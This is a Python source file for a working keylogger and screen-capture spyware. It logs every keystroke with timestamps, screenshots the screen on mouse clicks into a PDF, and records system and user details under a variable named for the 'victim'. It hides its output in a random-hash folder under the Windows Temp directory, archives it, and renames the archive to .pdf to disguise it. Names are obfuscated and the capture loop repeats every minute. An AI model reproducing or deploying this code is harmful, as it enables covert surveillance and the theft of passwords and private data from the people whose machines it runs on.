import datetime
import platform
import os
from pynput import mouse, keyboard
from PIL import ImageGrab, ImageDraw, ImageFont
from reportlab.lib.pagesizes import portrait
from reportlab.pdfgen import canvas
import pyautogui as siz
import tarfile
import shutil
import time
import hashlib
import random
import string
import sys

# Class definition
class lrygg:
    def generate_random_hash(self):
    # Generate random data
        random_data = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    
        # Calculate hash value
        hash_value = hashlib.sha256(random_data.encode()).hexdigest()
        return hash_value
    def REQdat(self):
        self.hshval = self.generate_random_hash()
        self.click_count = 0
        self.keydir = f'C:\\Windows\\Temp\\{self.hshval}\\'
        self.source_dir = f'C:\\Windows\\Temp\\{self.hshval}'
        self.output_filename = f'C:\\Windows\\Temp\\{self.hshval}.rar'
        self.fdate = datetime.datetime.now()
        os.makedirs(self.keydir, exist_ok=True)  # Fixed directory creation
        self.pdfpath = f"{self.keydir}{os.environ.get('USERNAME')}_{self.fdate.hour} {self.fdate.minute} {self.fdate.day}-{self.fdate.month}-{self.fdate.year}.pdf"
        self.fpath = f"{self.keydir}{os.environ.get('USERNAME')}_{self.fdate.hour} {self.fdate.minute} {self.fdate.day}-{self.fdate.month}-{self.fdate.year}.txt"
        self.pdffile = f'C:\\Windows\\Temp\\{self.hshval}.pdf'
        self.scrsi = siz.size()
        self.scrwid = self.scrsi.width
        self.scrhei = self.scrsi.height
        self.stop_flag = False
        
    def pdfdoc(self):
        self.c = canvas.Canvas(self.pdfpath, pagesize=(self.scrwid, self.scrhei))


    def usr_os(self):
        vic_name = platform.uname()
        with open(self.fpath, 'a') as f:
            f.write(f'''System & User Information
System: {vic_name.system}
Node Name: {vic_name.node}
Release: {vic_name.release}
Version: {vic_name.version}
Machine: {vic_name.machine}
Processor: {vic_name.processor}
Username: {os.getlogin()}\n
*****Keystrokes*****\n''')

    def take_screenshot_and_save_to_pdf(self,x, y):
        if self.click_count % 3 == 0:
            # Capture the entire screen
            screenshot = ImageGrab.grab(bbox=(0, 0, self.scrwid, self.scrhei))

            # Draw timestamp on the screenshot
            draw = ImageDraw.Draw(screenshot)
            font = ImageFont.truetype("arial.ttf", 16)  # Adjust font size and style as needed
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            draw.text((10, 10), timestamp, fill="red", font=font)
            draw.ellipse((x-5,y-5,x+5,y+5),outline='red')
            # Save the screenshot
            screenshot_path = os.path.join(self.keydir, f'screenshot_{self.click_count // 3}.png')
            screenshot.save(screenshot_path)

            # Add the screenshot to the PDF file
            self.c.showPage()  # Start a new page
            self.c.drawImage(screenshot_path, 0, 0, width=self.scrwid, height=self.scrhei)

            # Remove the temporary screenshot file
            os.remove(screenshot_path)

    #function for converting to rar
    def make_targz(self):
    # Create a RAR archive (compressed) from the source directory
        with tarfile.open(self.output_filename, "w:gz") as tar:
            tar.add(self.source_dir, arcname=os.path.basename(self.source_dir))

    #changing extension
    def change_extension(self,file_path, new_extension):
        # Split the file path into base and extension
        base_name, old_extension = os.path.splitext(file_path)
    
        # Create the new file path with the new extension
        new_file_path = base_name + new_extension
    
        # Rename the file to the new file path
        os.rename(file_path, new_file_path)



    # Function to handle mouse clicks
    def on_click(self, x, y, button, pressed):
        if pressed:
            self.click_count += 1
            self.take_screenshot_and_save_to_pdf(x, y)

    # Function to handle key presses
    def on_press(self, key):
        try:
            keytime =datetime.datetime.now()
            with open(self.fpath, 'a') as f:
                f.write(f'{keytime.strftime('%H:%M:%S.%f')[:-4]}    {key}\n')
                    
        except Exception as e:
            print(f"Error: {str(e)}")

        try:
            if key.char == 'q':  # Change 'q' to the desired key to stop the script
                self.stop_flag = True
                self.listener_mouse.stop()
                self.listener_keyboard.stop()
                self.c.save()
                
                return False
        except AttributeError:
            pass


    def driver(self):
        periodic_rep = 1  # Periodic repetition of code or file to be sent
        while True:
            start_time = time.time()
            self.REQdat()
            self.pdfdoc()  # Create PDF document
            self.usr_os()
            self.listener_mouse = mouse.Listener(on_click=self.on_click)
            self.listener_keyboard = keyboard.Listener(on_press=self.on_press)
            self.listener_mouse.start()
            self.listener_keyboard.start()

          

            while not self.stop_flag and time.time() - start_time < 60:
                time.sleep(1)
   
            self.listener_mouse.stop()
            self.listener_keyboard.stop()
            try:
                self.c.save()  # Save PDF file
            except RuntimeError:
                pass


            self.make_targz()  # Convert to RAR
            shutil.rmtree(self.source_dir, ignore_errors=True)  # Delete folder
            self.change_extension(self.output_filename, '.pdf')  # Change extension

            
            if self.stop_flag:
             
                break

# Create an instance of the class
kyyy = lrygg()
kyyy.driver()